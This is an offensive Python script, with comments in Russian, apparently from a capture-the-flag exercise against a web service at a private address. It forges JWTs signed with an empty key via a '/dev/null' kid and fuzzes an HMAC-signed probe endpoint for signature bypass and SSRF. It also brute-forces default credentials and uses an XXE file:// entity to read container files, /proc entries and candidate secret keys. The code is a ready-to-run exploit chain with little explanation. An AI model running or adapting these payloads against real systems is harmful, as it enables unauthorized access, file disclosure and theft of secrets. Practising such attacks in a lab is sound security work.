#!/usr/bin/env python3
"""round52 — Probe signature bypass + full page analysis + port 9000 auth"""
import requests, socket, time, json, hmac as hm, hashlib, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
P9000 = f"http://{HOST}:9000"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}
AUTH_CARRIER = {"Authorization": f"Bearer {jwt_forged('carrier')}"}

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# ============================================================
print("="*70)
print("PHASE 1: PROBE SIGNATURE BYPASS — МОЖНО ЛИ ОБОЙТИ ПОДПИСЬ?")
print("="*70)

# Test 1: Missing sig field
bypass_tests = [
    # No sig at all
    ({"url": KNOWN_URL}, "no sig"),
    # Empty sig
    ({"url": KNOWN_URL, "sig": ""}, "empty sig"),
    # Null sig
    ({"url": KNOWN_URL, "sig": None}, "null sig"),
    # Boolean sig
    ({"url": KNOWN_URL, "sig": True}, "true sig"),
    ({"url": KNOWN_URL, "sig": False}, "false sig"),
    # Zero sig
    ({"url": KNOWN_URL, "sig": 0}, "zero sig"),
    ({"url": KNOWN_URL, "sig": "0"*64}, "zero hex sig"),
    # Array sig
    ({"url": KNOWN_URL, "sig": [KNOWN_SIG]}, "array sig"),
    # Object sig
    ({"url": KNOWN_URL, "sig": {"value": KNOWN_SIG}}, "object sig"),
    # Valid sig with modified URL (SSRF to port 9000)
    ({"url": f"http://localhost:9000/", "sig": KNOWN_SIG}, "localhost:9000"),
    ({"url": f"http://127.0.0.1:9000/", "sig": KNOWN_SIG}, "127.0.0.1:9000"),
    ({"url": f"http://172.18.0.5:9000/", "sig": KNOWN_SIG}, "self:9000"),
    # No url
    ({"sig": KNOWN_SIG}, "no url"),
    # Both missing
    ({}, "empty body"),
    # Extra fields
    ({"url": KNOWN_URL, "sig": KNOWN_SIG, "skip_verify": True}, "skip_verify"),
    ({"url": KNOWN_URL, "sig": KNOWN_SIG, "verify": False}, "verify=false"),
    ({"url": KNOWN_URL, "sig": KNOWN_SIG, "debug": True}, "debug=true"),
    # URL type confusion
    ({"url": [KNOWN_URL], "sig": KNOWN_SIG}, "url as array"),
    ({"url": {"href": KNOWN_URL}, "sig": KNOWN_SIG}, "url as object"),
    # Integer types
    ({"url": KNOWN_URL, "sig": 0}, "sig=int(0)"),
    # Special sig values
    ({"url": KNOWN_URL, "sig": "undefined"}, "sig=undefined"),
    ({"url": KNOWN_URL, "sig": "null"}, "sig=null str"),
    ({"url": KNOWN_URL, "sig": "none"}, "sig=none"),
    ({"url": KNOWN_URL, "sig": "None"}, "sig=None"),
]

for payload, desc in bypass_tests:
    try:
        r = S.post(f"{CASPI}/api/ops/probe", json=payload,
                   headers={**AUTH_OP, "Content-Type": "application/json"}, timeout=5)
        status = r.status_code
        body = r.text[:200]
        if status == 200:
            print(f"  *** [{status}] {desc}: {body} ***")
        elif status != 403 and status != 400 and status != 401:
            print(f"  [{status}] {desc}: {body}")
        else:
            print(f"  [{status}] {desc}: {body[:80]}")
    except Exception as e:
        print(f"  [ERR] {desc}: {str(e)[:80]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PROBE POST — FORM-ENCODED + RAW")
print("="*70)

# Может сервер принимает form-encoded?
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               data=f"url={KNOWN_URL}&sig={KNOWN_SIG}",
               headers={**AUTH_OP, "Content-Type": "application/x-www-form-urlencoded"}, timeout=5)
    print(f"  form-encoded [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  form-encoded: {str(e)[:100]}")

# XML
try:
    xml = f"<probe><url>{KNOWN_URL}</url><sig>{KNOWN_SIG}</sig></probe>"
    r = S.post(f"{CASPI}/api/ops/probe",
               data=xml,
               headers={**AUTH_OP, "Content-Type": "application/xml"}, timeout=5)
    print(f"  XML [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  XML: {str(e)[:100]}")

# Valid sig — confirm it still works
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": KNOWN_SIG},
               headers={**AUTH_OP, "Content-Type": "application/json"}, timeout=5)
    print(f"\n  VALID probe [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  VALID: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: PROBE — URL NORMALIZATION TRICKS")
print("="*70)

# Если сервер нормализует URL перед HMAC но requests.get() не нормализует...
# Или наоборот
tricks = [
    # Unicode normalization
    (KNOWN_URL.replace("a", "a"), KNOWN_SIG, "unicode a"),
    # Double-encoded
    (KNOWN_URL.replace("/", "%2F"), KNOWN_SIG, "encoded slash"),
    # Protocol case
    (KNOWN_URL.replace("http://", "HTTP://"), KNOWN_SIG, "HTTP uppercase"),
    # Host case
    (KNOWN_URL.replace("gauge-gw", "GAUGE-GW"), KNOWN_SIG, "host uppercase"),
    # Port normalization
    (KNOWN_URL.replace(":9100", ":09100"), KNOWN_SIG, "port leading zero"),
    # Fragment
    (KNOWN_URL + "#", KNOWN_SIG, "trailing #"),
    # Userinfo
    ("http://x@gauge-gw.internal:9100/v1/meters/loading-arm-1/flow", KNOWN_SIG, "userinfo x@"),
    # Backslash
    (KNOWN_URL.replace("/v1/", "\\v1\\"), KNOWN_SIG, "backslash"),
    # Tab/space
    (KNOWN_URL + "\t", KNOWN_SIG, "trailing tab"),
    (" " + KNOWN_URL, KNOWN_SIG, "leading space"),
    # Null byte (truncation?)
    (KNOWN_URL + "\x00http://localhost:9000/", KNOWN_SIG, "null truncation"),
]

for url, sig, desc in tricks:
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
                   json={"url": url, "sig": sig},
                   headers={**AUTH_OP}, timeout=5)
        if r.status_code == 200:
            print(f"  *** [{r.status_code}] {desc}: {r.text[:200]} ***")
        else:
            print(f"  [{r.status_code}] {desc}: {r.text[:80]}")
    except Exception as e:
        print(f"  [ERR] {desc}: {str(e)[:60]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: ПОЛНЫЙ HTML СТРАНИЦ (ИЩЕМ СКРЫТЫЙ JS)")
print("="*70)

# Все HTML страницы приложения
pages = {
    "/ops": AUTH_OP,
    "/ops/custody": AUTH_OP,
    "/ops/diagnostics": AUTH_OP,
    "/portal": AUTH_CARRIER,
    "/services": {},
    "/login": {},
    "/register": {},
}

for path, auth in pages.items():
    try:
        r = S.get(f"{CASPI}{path}", headers=auth, timeout=5)
        print(f"\n{'─'*60}")
        print(f"  {path} [{r.status_code}] ({len(r.text)} bytes)")

        if r.status_code == 200:
            # Извлекаем ВСЕ скрипты
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
            for i, s in enumerate(scripts):
                if s.strip():
                    print(f"  SCRIPT {i+1}:")
                    print(f"    {s.strip()[:600]}")

            # Извлекаем ВСЕ ссылки
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', r.text)
            actions = re.findall(r'action=["\']([^"\']+)["\']', r.text)
            fetches = re.findall(r'fetch\(["\']([^"\']+)["\']', r.text)
            xhrs = re.findall(r'\.open\(["\'](?:GET|POST|PUT)["\'],\s*["\']([^"\']+)["\']', r.text)

            all_urls = set(hrefs + actions + fetches + xhrs)
            api_urls = [u for u in all_urls if '/api/' in u or u.startswith('http')]
            if api_urls:
                print(f"  API URLs: {api_urls}")

            # Ищем скрытые формы и input
            forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL)
            hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', r.text)
            if forms:
                print(f"  FORMS: {len(forms)} found")
                for f in forms:
                    print(f"    {f[:200]}")
            if hidden:
                print(f"  HIDDEN INPUTS: {hidden}")

            # Ищем комментарии HTML
            comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
            for c in comments:
                c = c.strip()
                if c and len(c) > 5:
                    print(f"  COMMENT: {c[:200]}")

            # Ищем data-* атрибуты
            data_attrs = re.findall(r'data-([a-z-]+)=["\']([^"\']+)["\']', r.text)
            if data_attrs:
                print(f"  DATA ATTRS: {data_attrs}")

    except Exception as e:
        print(f"  {path}: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: СТАТИЧЕСКИЕ ФАЙЛЫ")
print("="*70)

# Ищем JS файлы
static_files = [
    "/static/js/app.js",
    "/static/js/main.js",
    "/static/js/probe.js",
    "/static/js/diagnostics.js",
    "/static/js/ops.js",
    "/static/js/portal.js",
    "/static/js/bundle.js",
    "/static/js/script.js",
    "/static/app.js",
    "/static/main.js",
    "/static/probe.js",
    # Images/SVG might contain metadata
    "/static/img/logo.svg",
    "/static/images/logo.svg",
    "/static/favicon.ico",
    # Config
    "/static/config.js",
    "/static/config.json",
    "/static/manifest.json",
]

for sf in static_files:
    try:
        r = S.get(f"{CASPI}{sf}", timeout=3)
        if r.status_code == 200:
            print(f"  [{r.status_code}] {sf} ({len(r.text)} bytes):")
            print(f"    {r.text[:300]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PORT 9000 — BASIC AUTH + API KEY")
print("="*70)

# Пробуем basic auth с разными кредами
creds = [
    ("admin", "admin"),
    ("operator", "operator"),
    ("terminal_web", "terminal_web_pw"),
    ("ctf", "ctf"),
    ("caspi", "caspi"),
    ("probe", "probe"),
    ("root", "root"),
    ("admin", "password"),
    ("admin", "secret"),
]

for user, pwd in creds:
    try:
        r = S.get(f"{P9000}/", auth=(user, pwd), timeout=3)
        if r.status_code != 404 and r.status_code != 401:
            print(f"  [{r.status_code}] {user}:{pwd} → {r.text[:100]}")
    except:
        pass

# API key styles
for path in ["/", "/api", "/healthz", "/shell", "/probe", "/secret"]:
    for hdr_name, hdr_val in [
        ("X-API-Key", "terminal_web_pw"),
        ("X-API-Key", KNOWN_SIG),
        ("Authorization", "Bearer " + jwt_forged("operator")),
        ("Authorization", "Bearer " + jwt_forged("admin")),
    ]:
        try:
            r = S.get(f"{P9000}{path}", headers={hdr_name: hdr_val}, timeout=2)
            if r.status_code != 404:
                print(f"  [{r.status_code}] {path} + {hdr_name}: {r.text[:100]}")
                break
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: XXE — ПОЛНЫЙ CSS + ИЩЕМ JS")
print("="*70)

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# Полный CSS — может есть комментарии с подсказками
st, val = xxe_read("/app/static/css/app.css")
if st == "OK":
    # Ищем комментарии
    css_comments = re.findall(r'/\*(.*?)\*/', val, re.DOTALL)
    if css_comments:
        for c in css_comments:
            print(f"  CSS COMMENT: {c.strip()[:200]}")

    # Ищем URL references
    css_urls = re.findall(r'url\(([^)]+)\)', val)
    if css_urls:
        print(f"  CSS URLs: {css_urls}")

    # Показываем конец CSS (может быть комментарий)
    print(f"  CSS end: ...{val[-200:]}")

# JS файлы внутри контейнера
js_files = [
    "/app/static/js/app.js",
    "/app/static/js/main.js",
    "/app/static/js/probe.js",
    "/app/static/js/ops.js",
    "/app/static/js/diagnostics.js",
    "/app/static/js/script.js",
    "/app/static/app.js",
]

for jf in js_files:
    st, val = xxe_read(jf)
    if st == "OK" and val:
        print(f"\n  [JS FOUND] {jf}:")
        print(f"    {val[:500]}")
    elif st == "BIN":
        print(f"  [BIN] {jf}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: PROBE_SECRET ИЗ КЛЮЧЕВЫХ ФАЙЛОВ")
print("="*70)

# Может ключ лежит в файле с необычным именем
key_paths = [
    "/app/keys/hmac_secret",
    "/app/keys/probe.key",
    "/app/keys/probe.pem",
    "/app/keys/sign",
    "/app/keys/signing",
    "/app/keys/gauge",
    "/app/keys/gauge-gw",
    "/app/keys/internal",
    "/app/keys/api",
    "/app/keys/default",
    "/app/keys/master",
    "/app/keys/server",
    "/app/keys/app",
    "/app/probe.key",
    "/app/secret.key",
    "/app/hmac.key",
    "/app/signing.key",
    "/etc/probe_secret",
    "/var/probe_secret",
    "/run/probe_secret",
    "/tmp/probe_secret",
    # Maybe the key IS one of the known values but tested differently
]

for kp in key_paths:
    st, val = xxe_read(kp)
    if st == "OK" and val:
        print(f"  [KEY!] {kp}: {val[:200]}")
        # Test as PROBE_SECRET
        sig = hm.new(val.encode(), KNOWN_URL.encode(), hashlib.sha256).hexdigest()
        match = sig == KNOWN_SIG
        print(f"    HMAC test: {'MATCH!!!' if match else 'no match'}")
        if not match:
            # Try with newline stripped/added
            for v in [val.strip(), val.strip() + "\n", val.rstrip("\n")]:
                sig2 = hm.new(v.encode(), KNOWN_URL.encode(), hashlib.sha256).hexdigest()
                if sig2 == KNOWN_SIG:
                    print(f"    MATCH with variant!")
                    break
    elif st == "BIN":
        print(f"  [BIN] {kp}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: /.dockerenv + /proc DEEPER")
print("="*70)

# /.dockerenv
st, val = xxe_read("/.dockerenv")
print(f"  /.dockerenv: [{st}] {val[:200] if val else 'empty'}")

# /proc/self/status
st, val = xxe_read("/proc/self/status")
if st == "OK":
    print(f"\n  /proc/self/status:\n{val[:500]}")

# /proc/self/limits
st, val = xxe_read("/proc/self/limits")
if st == "OK":
    print(f"\n  /proc/self/limits:\n{val[:300]}")

# /proc/self/mountinfo (more detail than mounts)
st, val = xxe_read("/proc/self/mountinfo")
if st == "OK":
    # Look for interesting mount points
    for line in val.split('\n'):
        if 'secret' in line.lower() or 'probe' in line.lower() or 'key' in line.lower() or 'config' in line.lower():
            print(f"  mountinfo: {line}")

# /proc/self/oom_score_adj
st, val = xxe_read("/proc/self/oom_score_adj")
if st == "OK":
    print(f"  oom_score_adj: {val}")

# /proc/version
st, val = xxe_read("/proc/version")
if st == "OK":
    print(f"  /proc/version: {val[:200]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
